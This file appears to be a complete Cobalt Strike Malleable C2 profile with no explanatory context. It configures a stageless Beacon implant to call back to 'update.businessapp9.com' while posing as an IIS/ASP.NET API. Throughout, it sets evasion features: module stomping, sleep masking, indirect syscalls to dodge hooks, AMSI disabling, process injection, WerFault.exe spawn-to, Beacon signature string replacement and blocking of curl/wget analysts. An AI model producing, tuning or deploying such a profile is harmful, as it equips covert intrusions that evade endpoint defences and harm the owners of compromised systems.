## Global Settings
set sleeptime "60000";
set jitter "45";
set sample_name "HostUpdateAgent";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36";

# Staging disabled – using a fully stageless Beacon
set host_stage "false";

## (DNS Beacon block removed, as we will not use DNS beacons)

## HTTP Host Profiles
http-host-profiles {
  profile {
    set host-name "update.businessapp9.com";

    http-get {
      set uri "/api/v3/config/[init|health|status|check|diag|metrics|statm]";
      header "X-Powered-By" "ASP.NET";
      header "Authorization" "Bearer YTJiY2QzZDRmNWc2MDE2ZQ==";
      parameter "locale" "en-US";
      parameter "sessionKey" "[abc|xyz|def]-[100|200|300]";
    }

    http-post {
      set uri "/api/v3/config/[sync|update|set|refresh|push|commit]";
      header "X-Powered-By" "ASP.NET";
      header "Authorization" "Bearer YTJiY2QzZDRmNWc2MDE2ZQ==";
      parameter "locale" "en-US";
      parameter "sessionKey" "[abc|xyz|def]-[100|200|300]";
    }
  }
}

## HTTP GET: Beacon Retrieval
http-get {
  set uri "/api/v3/config/basecheck";

  client {
    parameter "ts" "[100|200|300|400]";
    metadata {
      base64;
      prepend "session_key=";
      header "Cookie";
    }
  }

  server {
    header "Server" "Microsoft-IIS/10.0";
    header "Content-Type" "application/json; charset=utf-8";
    header "Cache-Control" "no-cache, no-store, must-revalidate";
    header "Pragma" "no-cache";
    header "Expires" "0";

    output {
      base64;
      prepend "{\"status\":\"ok\",\"data\":\"";
      append "\"}";
      print;
    }
  }
}

## HTTP POST: Beacon Update
http-post {
  set uri "/api/v3/config/basepost-StatusData";

  client {
    id {
      base64url;
      parameter "session_id";
    }
    output {
      base64;
      print;
    }
  }

  server {
    header "Server" "Microsoft-IIS/10.0";
    header "Content-Type" "application/json; charset=utf-8";
    header "Cache-Control" "no-cache, no-store, must-revalidate";
    header "Pragma" "no-cache";
    header "Expires" "0";

    output {
      base64;
      prepend "{\"result\":\"success\",\"data\":\"";
      append "\"}";
      print;
    }
  }
}

## HTTP Server Config
http-config {
  set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
  header "Server" "Microsoft-IIS/10.0";
  header "Keep-Alive" "timeout=5, max=100";
  header "Connection" "Keep-Alive";
  set trust_x_forwarded_for "true";
  set block_useragents "curl*,lynx*,wget*";
}

## HTTPS Certificate
https-certificate {
  set C "US";
  set ST "WA";
  set L "Seattle";
  set O "Business Solutions Inc";
  set OU "IT Operations";
  set CN "update.businessapp9.com";
  set validity "365";
}

## Stage Configuration
stage {
  # Module stomping: use mshtml.dll for a more benign, well-known module.
  set module_x86 "mshtml.dll";
  set module_x64 "mshtml.dll";

  set userwx "false";
  set compile_time "14 Jul 2009 08:14:00";
  # Image sizes removed to let Beacon use the actual module size from disk.
  set obfuscate "true";
  set stomppe "true";         # Erase PE headers post-loading
  set sleep_mask "true";      # Encrypt Beacon in memory while idle
  set cleanup "true";         # Clean up reflective loader memory after initialization
  set userwx "false";
  set syscall_method "Indirect";  # Use indirect syscalls to evade hooks
  set allocator "VirtualAlloc";
  set magic_mz_x86 "MZRE";
  set magic_mz_x64 "OOPS";
  set magic_pe "EA";

  transform-x86 {
    prepend "\x48\x83\xEC\x20";
    strrep "ReflectiveLoader" "InitializeLib";
    strrep "BeaconCore" "ResModCore";
  }

  transform-x64 {
    prepend "\x48\x83\xEC\x20";
    strrep "ReflectiveLoader" "InitializeLibX";
    strrep "BeaconCore" "ResModCore";
  }

  stringw "Configuration loaded successfully";
  stringw "This is a sample log entry from a legitimate API response";
  stringw "Operation completed successfully";

  # Set beacon_gate to All for maximum in-memory obfuscation
  beacon_gate {
    All;
  }
}

## Process Injection Configuration
process-inject {
  set allocator "NtMapViewOfSection";
  set bof_allocator "VirtualAlloc";
  set bof_reuse_memory "true";
  set min_alloc "16384";
  set startrwx "false";
  set userwx "false";

  transform-x86 {
    prepend "\x66\x90";
  }

  transform-x64 {
    append "\x66\x90";
  }

  execute {
    NtQueueApcThread-s;
    SetThreadContext;
    CreateRemoteThread;
    RtlCreateUserThread;
  }
}

## Post-Exploitation Configuration
post-ex {
  # Use WerFault for improved blending into legitimate system processes.
  set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
  set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
  set obfuscate "true";
  set amsi_disable "true";
  set smartinject "true";
  set pipename "DbgEvtLogs_###, WinEventSys_Collector, diag_pipe_##";

  transform-x64 {
    strrepex "PortScanner" "Scanner module is complete" "Scan finished (x64)";
    strrep "is alive." "online.";
  }

  transform-x86 {
    strrepex "PortScanner" "Scanner module is complete" "Scan finished (x86)";
    strrep "is alive." "online.";
  }
}
